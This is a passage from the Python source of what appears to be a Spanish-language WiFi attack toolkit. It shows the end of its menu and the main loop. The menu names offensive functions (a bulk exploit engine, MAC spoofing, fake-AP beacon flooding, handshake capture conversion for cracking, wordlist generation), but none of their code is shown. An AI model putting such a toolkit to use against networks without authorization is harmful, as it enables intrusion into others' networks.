    36:   ("Exploit Engine MASIVO (varias redes)",         exploit_engine_bulk),
    # ── Utilidades ────────────────────────────────────────────────────────────
    12:   ("Falsificar MAC",                           spoof_mac),
    14:   ("Fake AP (beacon flood)",                   fake_ap),
    19:   ("Convertir .cap → hc22000",                 convert_cap),
    20:   ("Chequeo de dependencias",                  check_dependencies),
    37:   ("Setup Adaptador WiFi (driver + monitor)",  setup_adapter),
    38:   ("Lista adaptadores soportados",             list_supported_adapters),
    24:   ("OSINT Wordlist Generator",                 osint_wordlist),
    29:   ("Ver historial de capturas",                show_history),
    30:   ("Generar Reporte HTML",                     generate_report),
    0:    ("Salir",                                    None),
}

def main():
    init_db()

    while True:
        os.system("clear")
        banner()
        menu()

        try:
            seleccion = input(f" {WHITE}Opción: {GREEN}>>{END} ").strip().lower()
        except (KeyboardInterrupt, EOFError):
            continue

        if seleccion == "0":
            os.system("clear")
            goodbye()
            sys.exit(0)

        if seleccion in ("w",):
            key = "w"
        elif seleccion.isdigit():
            key = int(seleccion)
        else:
            continue

        if key not in OPCIONES:
            error("Opción no válida.")
            time.sleep(1)
            continue

        os.system("clear")
        banner()
        nombre, funcion = OPCIONES[key]
        print(f"\n {CYAN}[»]{END} {WHITE}{nombre}{END}\n")

        try:
            funcion()
        except KeyboardInterrupt:
            warn("\nOperación cancelada.")
            time.sleep(1)
        except Exception as e:
            error(f"Error inesperado: {e}")
            time.sleep(2)

if __name__ == "__main__":
    if os.geteuid() != 0:
        error("Requiere permisos root. Ejecute: sudo python3 herradura.py")
        sys.exit(1)
    main()
